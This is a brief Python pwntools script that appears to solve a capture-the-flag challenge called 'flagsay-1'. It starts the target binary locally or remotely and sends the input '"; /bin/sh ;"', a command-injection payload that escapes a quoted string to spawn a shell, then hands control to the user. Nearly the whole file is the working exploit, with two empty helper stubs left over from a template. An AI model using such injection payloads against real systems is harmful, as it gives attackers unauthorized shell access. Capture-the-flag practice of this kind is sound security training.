from pwn import *

e = ELF("./flagsay-1")
#libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("", 0)
else:
  p = process(e.path)

def alloc(p):
  p.clean()

def free(p, idx):
  p.clean()

p.sendline('"; /bin/sh ;"')

p.interactive()
